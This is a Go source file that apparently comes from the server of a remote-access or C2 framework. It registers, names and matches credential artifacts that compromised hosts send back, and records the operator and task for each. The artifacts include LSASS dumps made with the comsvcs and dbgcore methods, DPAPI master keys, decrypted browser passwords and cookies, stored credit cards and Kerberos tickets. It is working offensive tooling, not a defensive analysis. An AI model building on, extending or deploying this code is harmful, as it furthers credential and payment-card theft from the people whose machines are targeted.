// Package cred 凭据获取链路：制品请求登记、制品识别与校验。
//
// 为什么服务端要"登记请求再匹配"：制品是客户端经通用下载通道回传的普通文件，
// 服务端只看文件本身无法知道它是"哪次凭据请求的产物、属于哪个任务、谁下的命令"。
// 下发时先登记（uid + 期望文件名 + 任务 + 操作员 + 有效期），回传完成时按
// 文件名精确匹配，任务归属、制品来源与审计记录才能对得上。
package cred

import (
	"fmt"
	"sort"
	"strings"
	"sync"
	"time"
)

// 制品类型
const (
	KindLsass   = "lsass"   // LSASS 内存转储（二进制转储，服务端只校验形态）
	KindDPAPI   = "dpapi"   // DPAPI 主密钥集（ZIP 制品，用户作用域已解密）
	KindBrowser = "browser" // 浏览器凭据与 Cookie（JSON 制品，客户端已解密为明文）
	KindTicket  = "ticket"  // Kerberos 票据缓存（ZIP：manifest.json + tickets/*.ccache，服务端解析）
)

// 制品形态：决定回传后用什么方式校验（与客户端产出的文件类型一一对应）
const (
	FormatMinidump = "minidump"
	FormatZip      = "zip"
	FormatJSON     = "json"
)

// Kinds 支持的制品类型
var Kinds = []string{KindLsass, KindDPAPI, KindBrowser, KindTicket}

// techsByKind 每种制品类型可用的获取技术（与客户端 core/services/cred.go 的分派一致）。
// 技术不是全局枚举：把 "browser" 和 "comsvcs" 配在一起没有意义，
// 分开校验才能在操作员配错时立刻报错，而不是下发一个必然失败的任务。
var techsByKind = map[string][]string{
	KindLsass:   {"auto", "comsvcs", "dbgcore"},
	KindDPAPI:   {"keys"},
	KindBrowser: {"all", "chrome", "edge", "firefox", "cards"}, // cards = Chromium Web Data（信用卡 + 自动填充）
	KindTicket:  {"files", "lsa"}, // files = MIT ccache 文件；lsa = Windows LSA 缓存导出 kirbi
}

// DefaultTech 某类型的默认技术
func DefaultTech(kind string) string {
	if ts := techsByKind[kind]; len(ts) > 0 {
		return ts[0]
	}
	return "auto"
}

// extByKind 制品扩展名（服务端定名，客户端照此命名才能精确匹配回传文件）。
// 扩展名同时是对操作员的提示：.dmp 要本地解析，.json 已可直接阅读。
var extByKind = map[string]string{
	KindLsass:   ".dmp",
	KindDPAPI:   ".zip",
	KindBrowser: ".json",
	KindTicket:  ".zip",
}

// IsKindSupported 制品类型是否支持
func IsKindSupported(kind string) bool {
	_, ok := techsByKind[kind]
	return ok
}

// TechsFor 某制品类型支持的技术列表（前端下拉与校验共用）
func TechsFor(kind string) []string {
	src := techsByKind[kind]
	out := make([]string, len(src))
	copy(out, src)
	return out
}

// IsTechSupportedFor 某制品类型下该技术是否支持
func IsTechSupportedFor(kind, tech string) bool {
	for _, t := range techsByKind[kind] {
		if t == tech {
			return true
		}
	}
	return false
}

// ExtensionFor 制品扩展名
func ExtensionFor(kind string) string {
	if ext, ok := extByKind[kind]; ok {
		return ext
	}
	return ".dmp"
}

// ArtifactRequest 一次凭据获取请求（等待客户端回传制品）
type ArtifactRequest struct {
	UID      string    `json:"uid"`
	Kind     string    `json:"kind"`
	FileName string    `json:"file_name"`
	Tech     string    `json:"tech"`
	Format   string    `json:"format,omitempty"` // 制品形态（formatByKind，登记时固化）
	TaskID   int64     `json:"task_id"`
	Operator string    `json:"operator"`
	Issued   time.Time `json:"issued_at"`
	Expires  time.Time `json:"expires_at"`
}

// FormatByKind 制品形态（与客户端产出文件类型一一对应）
func FormatByKind(kind string) string {
	switch kind {
	case KindDPAPI:
		return FormatZip
	case KindBrowser:
		return FormatJSON
	case KindTicket:
		return FormatZip
	default:
		return FormatMinidump
	}
}

// Sanitize 补全旧登记记录的缺省字段（Format 是本轮新增字段，
// 直接构造 ArtifactRequest 的调用方可以省略，按 kind 推断）。
func (r *ArtifactRequest) Sanitize() {
	if r.Kind == "" {
		r.Kind = KindLsass
	}
	if r.Tech == "" {
		r.Tech = DefaultTech(r.Kind)
	}
	if r.Format == "" {
		r.Format = FormatByKind(r.Kind)
	}
}

// Registry 未完成请求的登记表（并发安全）
type Registry struct {
	mu    sync.Mutex
	now   func() time.Time // 可注入时钟（测试用）
	byUID map[string][]*ArtifactRequest
}

// NewRegistry 创建登记表
func NewRegistry() *Registry {
	return &Registry{now: time.Now, byUID: make(map[string][]*ArtifactRequest)}
}

// Global 全局登记表
var Global = NewRegistry()

// Issue 登记一次请求。同一 uid 下已存在同名未完成请求时返回错误
// （避免两次请求互相顶掉，回传的制品归属到错的任务上）。
func (r *Registry) Issue(req ArtifactRequest, ttl time.Duration) error {
	if req.UID == "" || req.FileName == "" {
		return fmt.Errorf("uid 与文件名不能为空")
	}
	r.mu.Lock()
	defer r.mu.Unlock()
	r.sweepLocked()
	req.Sanitize()
	for _, e := range r.byUID[req.UID] {
		if e.FileName == req.FileName {
			return fmt.Errorf("同名请求已存在: %s", req.FileName)
		}
	}
	if req.Issued.IsZero() {
		req.Issued = r.now()
	}
	req.Expires = req.Issued.Add(ttl)
	cp := req
	r.byUID[req.UID] = append(r.byUID[req.UID], &cp)
	return nil
}

// Match 按 (uid, 文件名) 匹配并移除一条未完成请求。
// 只做精确匹配：客户端回了别的文件名就当作普通下载，宁可漏认也不错认
// （错认会把无关文件登记成"凭据制品"，比漏认危险得多）。
func (r *Registry) Match(uid, fileName string) (ArtifactRequest, bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.sweepLocked()
	entries := r.byUID[uid]
	for i, e := range entries {
		if e.FileName != fileName {
			continue
		}
		r.byUID[uid] = append(entries[:i:i], entries[i+1:]...)
		if len(r.byUID[uid]) == 0 {
			delete(r.byUID, uid)
		}
		return *e, true
	}
	return ArtifactRequest{}, false
}

// Cancel 撤销一次请求（下发失败时调用）
func (r *Registry) Cancel(uid, fileName string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	entries := r.byUID[uid]
	for i, e := range entries {
		if e.FileName != fileName {
			continue
		}
		r.byUID[uid] = append(entries[:i:i], entries[i+1:]...)
		break
	}
	if len(r.byUID[uid]) == 0 {
		delete(r.byUID, uid)
	}
}

// Pending 列出某 uid 尚未回传的请求（前端提示"等待回传"用）；uid 为空时列出全部
func (r *Registry) Pending(uid string) []ArtifactRequest {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.sweepLocked()
	out := make([]ArtifactRequest, 0, 2)
	appendUID := func(list []*ArtifactRequest) {
		for _, e := range list {
			out = append(out, *e)
		}
	}
	if uid == "" {
		for _, list := range r.byUID {
			appendUID(list)
		}
	} else {
		appendUID(r.byUID[uid])
	}
	sort.Slice(out, func(i, j int) bool { return out[i].Issued.After(out[j].Issued) })
	return out
}

// Sweep 清理过期请求，返回清理条数（客户端长时间不回传时不留下永远"等待中"的记录）
func (r *Registry) Sweep() int {
	r.mu.Lock()
	defer r.mu.Unlock()
	return r.sweepLocked()
}

func (r *Registry) sweepLocked() int {
	now := r.now()
	removed := 0
	for uid, entries := range r.byUID {
		kept := entries[:0]
		for _, e := range entries {
			if now.After(e.Expires) {
				removed++
				continue
			}
			e.Sanitize() // 旧登记记录缺 Format 时补齐，前端与校验都能拿到完整字段
			kept = append(kept, e)
		}
		if len(kept) == 0 {
			delete(r.byUID, uid)
			continue
		}
		r.byUID[uid] = kept
	}
	return removed
}

// NewFileName 生成制品文件名（服务端定名，客户端照此命名，回传时才能精确匹配）。
// 主机名参与命名便于运维辨认；非法字符一律替换，避免路径注入。
// 扩展名按制品类型取（LSASS 转储 .dmp / DPAPI 主密钥包 .zip / 浏览器凭据 .json）。
func NewFileName(kind, host string, now time.Time) string {
	host = sanitizeHost(host)
	if host == "" {
		host = "unknown"
	}
	return fmt.Sprintf("%s-%s-%s%s", kind, host, now.Format("20060102-150405"), ExtensionFor(kind))
}

// sanitizeHost 主机名只保留字母数字与 - _，其余替换为 _（限制长度防超长文件名）
func sanitizeHost(host string) string {
	host = strings.TrimSpace(host)
	if len(host) > 32 {
		host = host[:32]
	}
	return strings.Map(func(r rune) rune {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-', r == '_':
			return r
		default:
			return '_'
		}
	}, host)
}
